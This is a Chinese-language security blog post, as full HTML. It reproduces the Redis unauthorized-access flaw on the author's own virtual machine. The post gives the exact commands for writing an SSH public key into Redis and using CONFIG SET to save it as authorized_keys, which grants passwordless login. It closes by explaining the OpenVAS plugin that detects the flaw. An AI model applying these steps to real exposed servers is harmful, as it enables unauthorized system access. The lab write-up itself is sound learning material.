@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+	<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+    <meta name="description" content="龅牙晴在 Github 上的个人博客">
+    <meta name="keyword" content="安全，漏洞挖掘，漏洞复现">
+    <meta name="theme-color" content="#600090">
+    <meta name="msapplication-navbutton-color" content="#600090">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="#600090">
+    <link rel="shortcut icon" href="https://cdn4.iconfinder.com/data/icons/ionicons/512/icon-person-128.png">
+    <link rel="alternate" type="application/atom+xml" title="折戟" href="/atom.xml">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.css">
+    <title>
+        
+        redis未授权访问漏洞｜R_song&#39;s blog
+        
+    </title>
+
+    <link rel="canonical" href="http://rliyuqing.github.io/2019/04/15/2. redis未授权访问漏洞/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/blog-style.css">
+
+    <!-- Pygments Github CSS -->
+    <link rel="stylesheet" href="/css/syntax.css">
+</head>
+
+<style>
+
+    header.intro-header {
+        background-image: url('http://upload-images.jianshu.io/upload_images/6269327-c23742a390edde52.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240')
+    }
+</style>
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="" class="animated fadeIn">
+<!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top " id="nav-top" data-ispost="true" data-istags="false
+" data-ishome="false">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand animated pulse" href="/">
+                <span class="brand-logo">
+                    折戟
+                </span>
+                's Blog
+            </a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <!-- /.navbar-collapse -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+					
+                    
+                        
+							
+                        <li>
+                            <a href="/categories/">categories</a>
+                        </li>
+							
+						
+                    
+                        
+							
+                        <li>
+                            <a href="/tags/">tags</a>
+                        </li>
+							
+						
+                    
+					
+					
+                </ul>
+            </div>
+        </div>
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+//    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+<!-- Main Content -->
+
+<!--only post-->
+
+
+<img class="wechat-title-img" src="http://upload-images.jianshu.io/upload_images/6269327-c23742a390edde52.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+
+<style>
+    
+    header.intro-header {
+        background-image: url('http://upload-images.jianshu.io/upload_images/6269327-c23742a390edde52.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240')
+    }
+
+    
+</style>
+
+<header class="intro-header">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                <div class="post-heading">
+                    <h1>redis未授权访问漏洞</h1>
+                    
+                    <span class="meta">
+                         作者 折戟
+                        <span>
+                          日期 2019-04-15
+                         </span>
+                    </span>
+                    <div class="tags text-center">
+                        
+                        <a class="tag" href="/tags/#redis未授权访问" title="redis未授权访问">redis未授权访问</a>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="post-title-haojen">
+        <span>
+            redis未授权访问漏洞
+        </span>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Container -->
+            <div class="col-lg-8 col-lg-offset-1 col-sm-9 post-container">
+                <hr>
+<h1 id="redis未授权访问漏洞"><a href="#redis未授权访问漏洞" class="headerlink" title="redis未授权访问漏洞"></a>redis未授权访问漏洞</h1><hr>
+<h2 id="了解漏洞"><a href="#了解漏洞" class="headerlink" title="了解漏洞"></a>了解漏洞</h2><h3 id="redis是什么？"><a href="#redis是什么？" class="headerlink" title="redis是什么？"></a>redis是什么？</h3><p>通过查阅资料可知，redis即为key-value数据库中的一种。这有点用名词解释名词了，但是这有必要先解释一下key-value数据库。<br>Key-value数据库顾名思义就是利用键和数据值相对应存储的一种数据库，就类似于java中的map。我们整个数据库就可以看成一个大的map，在map中一个特地的key对应一个唯一的value。<br>同时我们redis作为key-value数据库的一种他支持很多很多的value的类型，redis也是一种内存型的数据库，所以可以提供高效率的读写，但同时他占用cpu将会很高。在内存上操作， 我们很容易想到数据的持久化的问题，不用担心，redis可以将数据持久化到硬盘中，所以在对不同数据集进行高速读写时需要权衡内存，因为数据量不能大于硬件内存。<br>看看网上说的reids相对于其他key-value数据库的三大优点：<br>·Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，重启的时候可以再次加载进行使用。<br>·Redis不仅仅支持简单的key-value类型的数据，同时还提供list，set，zset，hash等数据结构的存储。<br>·Redis支持数据的备份，即master-slave模式的数据备份。</p>
+<h3 id="redis未授权访问漏洞-1"><a href="#redis未授权访问漏洞-1" class="headerlink" title="redis未授权访问漏洞"></a>redis未授权访问漏洞</h3><p>Redis在默认情况会将服务绑定在0.0.0.0:6379上，从而将服务暴露在公网环境下，如果在没有开启安全认证的情况下，可以导致任意用户未授权访问Redis服务器并Redis进行读写操作。攻击者在未授权访问Redis服务器时可以通过上传公钥的方法将自己的公钥上传到Redis服务器上，达到免密登陆的效果。</p>
+<h3 id="具体漏洞描述"><a href="#具体漏洞描述" class="headerlink" title="具体漏洞描述"></a>具体漏洞描述</h3><p>Redis 安全模型的观念是: “请不要将 Redis 暴露在公开网络中, 因为让不受信任的客户接触到 Redis 是非常危险的” 。<br>Redis 作者之所以放弃解决未授权访问导致的不安全性是因为, 99.99% 使用 Redis 的场景都是在沙盒化的环境中, 为了0.01%的可能性增加安全规则的同时也增加了复杂性, 虽然这个问题的并不是不能解决的, 但是这在他的设计哲学中仍是不划算的。<br>因为其他受信任用户需要使用 Redis 或者因为运维人员的疏忽等原因，部分 Redis 绑定在 0.0.0.0:6379，并且没有开启认证（这是Redis 的默认配置），如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，将会导致<br>Redis 服务直接暴露在公网上，导致其他用户可以直接在非授权情况下直接访问Redis服务并进行相关操作。<br>利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以直接使用对应的私钥登录目标服务器。</p>
+<h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p>如果攻击者进入了我们的redis服务器，他便可以自由下载数据库中的文件，造成信息泄露，造成个人隐私泄露或者公司机密泄露，造成巨大损害。同时如果攻击者进行提权获取更大的权限，还会产生更大的危害。<br>我尝试使用Shodan对公网上的开放的redis进行搜索（port:6379）：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-7fc09c6976b6b496.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"><br>我们可以看到一共有87881个结果，其中我国位列榜首。。。。国人的安全意识还是有待提高。<br>看一下具体地图分布吧：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-8b7e33954b786784.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"><br>两次搜索数量有一点不一样。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-4f7cad8bdf84c769.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.png"><br>榜首竟然是杭州阿里巴巴。</p>
+<h2 id="漏洞的复现和利用"><a href="#漏洞的复现和利用" class="headerlink" title="漏洞的复现和利用"></a>漏洞的复现和利用</h2><h3 id="安装redis（我采用源码安装）"><a href="#安装redis（我采用源码安装）" class="headerlink" title="安装redis（我采用源码安装）"></a>安装redis（我采用源码安装）</h3><h4 id="首先下载源码然后编译安装"><a href="#首先下载源码然后编译安装" class="headerlink" title="首先下载源码然后编译安装"></a>首先下载源码然后编译安装</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ wget http://download.redis.io/releases/redis-4.0.6.tar.gz</span><br><span class="line">$ tar xzf redis-4.0.6.tar.gz</span><br><span class="line">$ <span class="built_in">cd</span> redis-4.0.6</span><br><span class="line">$ make</span><br></pre></td></tr></table></figure>
+<p>编译完成：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-2d19a664cbbf55d2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.png"></p>
+<h4 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h4><p>在Src目录下，有四个可执行文件redis-server、redis-benchmark、redis-cli和redis.conf（这个在安装目录）。然后拷贝到一个目录下。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ mkdir /usr/redis</span><br><span class="line">$ cp redis-server  /usr/redis</span><br><span class="line">$ cp redis-benchmark /usr/redis</span><br><span class="line">$ cp redis-cli  /usr/redis</span><br><span class="line">$ cp redis.conf  /usr/redis</span><br><span class="line">$ <span class="built_in">cd</span> /usr/redis</span><br></pre></td></tr></table></figure></p>
+<h4 id="开启redis服务"><a href="#开启redis服务" class="headerlink" title="开启redis服务"></a>开启redis服务</h4><p>直接进入刚刚创建的redis文件夹后执行<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./redis-server ./redis.conf</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/6269327-91c08afaf7ce1fe8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.png"></p>
+<h4 id="检查是否成功开启"><a href="#检查是否成功开启" class="headerlink" title="检查是否成功开启"></a>检查是否成功开启</h4><p><img src="http://upload-images.jianshu.io/upload_images/6269327-dcf471aeeacd9fbb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.png"></p>
+<h4 id="配置redis，使他处于漏洞状态"><a href="#配置redis，使他处于漏洞状态" class="headerlink" title="配置redis，使他处于漏洞状态"></a>配置redis，使他处于漏洞状态</h4><p>我直接开启了redis，此时没有认证，redis的默认就是这样，然后我只需要将redis更改绑定在0.0.0.0:6379就可以，在redis.conf里面更改就行了。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-d5816eceeec8f77a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.png"></p>
+<h4 id="尝试使用namp扫描了一下我的6379端口"><a href="#尝试使用namp扫描了一下我的6379端口" class="headerlink" title="尝试使用namp扫描了一下我的6379端口"></a>尝试使用namp扫描了一下我的6379端口</h4><p><img src="http://upload-images.jianshu.io/upload_images/6269327-edefc35b34a306a0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.png"><br>可以看到一下子就可扫描出信息，而且包含一下敏感信息。</p>
+<h4 id="尝试利用redis客户端进行未授权访问"><a href="#尝试利用redis客户端进行未授权访问" class="headerlink" title="尝试利用redis客户端进行未授权访问"></a>尝试利用redis客户端进行未授权访问</h4><p><img src="http://upload-images.jianshu.io/upload_images/6269327-96f441ad5cf753d8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="9.png"><br>果然，很成功就进入了，上门查看了主机信息（信息在下面，没截图）</p>
+<h4 id="开启公钥登录"><a href="#开启公钥登录" class="headerlink" title="开启公钥登录"></a>开启公钥登录</h4><p>生成公钥：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh-keygen -t rsa //rsa加密</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/6269327-fb1eccee2bbc48d4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="10.png"><br>然后将公钥写入文本：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~/.ssh/</span><br><span class="line">$ (<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>; cat id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">"\n\n"</span>)&gt; 1.txt</span><br></pre></td></tr></table></figure></p>
+<p>将1.txt写入redis<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat 1.txt | /usr/redis/./redis-cli -h 127.0.0.1  -x <span class="built_in">set</span> crack</span><br></pre></td></tr></table></figure></p>
+<p>利用redis客户端连接<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./redis-cli -h 127.0.0.1</span><br></pre></td></tr></table></figure></p>
+<p>获取redis备份路径，更改redis备份路径，设置备份文件的名称为authorized_key<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ CONFIG GET dir</span><br><span class="line">$ CONFIG SET dir /home/r_song/.ssh     //更改目录到r_song下</span><br><span class="line">$ CONFIG SET dbfilename authorized_keys  </span><br><span class="line">$ CONFIG GET dbfilename     //获取确认一下更改成功</span><br><span class="line">$ Save        //保存</span><br></pre></td></tr></table></figure></p>
+<p>然后用ssh进行连接即可(在.ssh路径执行，并先把我们虚拟机的ssh服务打开)<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh –i  id_rsa ******@127.0.0.1</span><br></pre></td></tr></table></figure></p>
+<p>就可以成功登录。</p>
+<h2 id="使用openvas对我们存在漏洞的系统进行扫描"><a href="#使用openvas对我们存在漏洞的系统进行扫描" class="headerlink" title="使用openvas对我们存在漏洞的系统进行扫描"></a>使用openvas对我们存在漏洞的系统进行扫描</h2><h3 id="查扫描结果（在上一篇博客介绍了openvas）"><a href="#查扫描结果（在上一篇博客介绍了openvas）" class="headerlink" title="查扫描结果（在上一篇博客介绍了openvas）"></a>查扫描结果（在上一篇博客介绍了openvas）</h3><p><img src="http://upload-images.jianshu.io/upload_images/6269327-47cd19d87e363524.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="12.png"><br>从图中我们可以看到，redis-1我是使用默认的扫描方式，然后redis2是扫描的all tcp and namp 5.1 top100扫描的但是结果不一样。我们重点看redis2这个扫描结果：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-723ad76a9628d6ad.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="13.png"><br>可以看到扫描出了redis服务没有密码。</p>
+<h3 id="了解openvas使用的各种插件，即nvt是什么"><a href="#了解openvas使用的各种插件，即nvt是什么" class="headerlink" title="了解openvas使用的各种插件，即nvt是什么"></a>了解openvas使用的各种插件，即nvt是什么</h3><p>Nvt（network vulnerability tests）即网络漏洞测试，是openvas中的免费的扫描插件。我可以在线同步获取这个插件（openvas-nvt-sync）或者离线下载。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-f12bb14d87c765fd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="14.png"><br>这是我在官网上找到的openvas工作的图，可以看到，openvas的插件nvt是在openvas scanner提供服务的。nvt就是根据不同的需求调用nasl脚本进行检测。</p>
+<h3 id="对应扫描该漏洞的nvt是什么？"><a href="#对应扫描该漏洞的nvt是什么？" class="headerlink" title="对应扫描该漏洞的nvt是什么？"></a>对应扫描该漏洞的nvt是什么？</h3><p>在扫描结果中可以找到nvt的名称，以及OID编号，在 <a href="http://www.openvas.org/openvas-nvt-feed.html" target="_blank" rel="noopener">http://www.openvas.org/openvas-nvt-feed.html</a> 中可以根据OID编号查找对应nvt的文件名是什么，然后可以在/var/lib/openvas/plugins/目录下，找到该文件。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-4fc9aecc239752a6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="15.png"><br>找到指定文件：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-a12fd1dd28524475.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="16.png"><br><img src="http://upload-images.jianshu.io/upload_images/6269327-1c76f50da5c85178.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="17.png"><br>前面是这个nvt的一些信息，比如oid，version，还有危险评分等。Family是属于database的。基本这些都是信息。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-911af7277c87e599.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="18.png"><br>主要就是后面几行，先获取了端口信息，确定端口是否打开：get_app_port()。然后使用get_kb_item(〈name〉)函数可以获得基本信息的〈name〉项的值，这个函数是匿名函数。通过测试no_password如果成功了就说明有这个漏洞，然后退出。后面是加密信息端口号。</p>
+
+                <hr>
+                
+
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/2019/04/15/5. heartbleed漏洞及内存信息窃取/" data-toggle="tooltip" data-placement="top" title="heartbleed漏洞及内存信息窃取">&larr; Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/2019/04/15/3. MySQL弱密码和webshell（附可用于php7的菜刀）/" data-toggle="tooltip" data-placement="top" title="MySQL弱密码和webshell（附可用于php7的菜刀）">Next Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+                
+
+                
+
+
+                <!--加入新的评论系统-->
+                
+            </div>
+
+            <div class="hidden-xs col-sm-3 toc-col">
+                <div class="toc-wrap">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#redis未授权访问漏洞"><span class="toc-text">redis未授权访问漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#了解漏洞"><span class="toc-text">了解漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#redis是什么？"><span class="toc-text">redis是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#redis未授权访问漏洞-1"><span class="toc-text">redis未授权访问漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#具体漏洞描述"><span class="toc-text">具体漏洞描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞危害"><span class="toc-text">漏洞危害</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞的复现和利用"><span class="toc-text">漏洞的复现和利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#安装redis（我采用源码安装）"><span class="toc-text">安装redis（我采用源码安装）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#首先下载源码然后编译安装"><span class="toc-text">首先下载源码然后编译安装</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#配置文件"><span class="toc-text">配置文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#开启redis服务"><span class="toc-text">开启redis服务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#检查是否成功开启"><span class="toc-text">检查是否成功开启</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#配置redis，使他处于漏洞状态"><span class="toc-text">配置redis，使他处于漏洞状态</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#尝试使用namp扫描了一下我的6379端口"><span class="toc-text">尝试使用namp扫描了一下我的6379端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#尝试利用redis客户端进行未授权访问"><span class="toc-text">尝试利用redis客户端进行未授权访问</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#开启公钥登录"><span class="toc-text">开启公钥登录</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#使用openvas对我们存在漏洞的系统进行扫描"><span class="toc-text">使用openvas对我们存在漏洞的系统进行扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#查扫描结果（在上一篇博客介绍了openvas）"><span class="toc-text">查扫描结果（在上一篇博客介绍了openvas）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#了解openvas使用的各种插件，即nvt是什么"><span class="toc-text">了解openvas使用的各种插件，即nvt是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#对应扫描该漏洞的nvt是什么？"><span class="toc-text">对应扫描该漏洞的nvt是什么？</span></a></li></ol></li></ol></li></ol>
+                </div>
+            </div>
+        </div>
+
+        <div class="row">
+            <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5 class="text-center">
+                        <a href="/tags/">FEATURED TAGS</a>
+                    </h5>
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/#redis未授权访问" title="redis未授权访问">redis未授权访问</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <div style="margin-top: 20px;">
+                    <h5 class="text-center">FRIENDS</h5>
+                    <ul class="list-inline text-center">
+                        
+                        <li><a href="https://teazmh.github.io/">Tea_Mh</a></li>
+                        
+                        <li><a href="https://zheng19970225.github.io/">让子弹飞一会</a></li>
+                        
+                        <li><a href="https://luckyjq.github.io/">LuckyQ</a></li>
+                        
+                    </ul>
+                </div>
+                
+            </div>
+        </div>
+
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- Footer -->
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                <br>
+                <ul class="list-inline text-center">
+                
+                
+                    <li>
+                        <a target="_blank" href="https://twitter.com/IIGHJH5O4mvbeF9?s=09">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+                
+                    <li>
+                        <a target="_blank" href="https://www.zhihu.com/people/rao-song-63?utm_source=qq&amp;utm_medium=social">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa  fa-stack-1x fa-inverse">知</i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+                    <li>
+                        <a target="_blank" href="http://weibo.com/u/3870422953?refer_flag=1001030001_&amp;nick=RS丶从徒手开碧根果开始">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-weibo fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank" href="https://github.com/rliyuqing">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; 折戟 2019
+                    <br>
+                    <span id="busuanzi_container_site_pv" style="font-size: 12px;">PV: <span id="busuanzi_value_site_pv"></span> Times</span>
+                    <br>
+                     Theme by Haojen Ma
+                </p>
+
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/blog.js"></script>
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("http://rliyuqing.github.io/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+<!-- Google Analytics -->
+
+
+
+<!-- Baidu Tongji -->
+
+
+<!-- swiftype -->
+<script type="text/javascript">
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+  (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+  e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+  _st('install','','2.0.0');
+</script>
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<!--wechat title img-->
+<img class="wechat-title-img" src="http://upload-images.jianshu.io/upload_images/6269327-4c7992ea7ad8aea9.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+<script type="text/javascript"
+color="0,0,0" opacity='0.4' zIndex="-2" count="66" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+	
+
+
+</body>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
+</html>
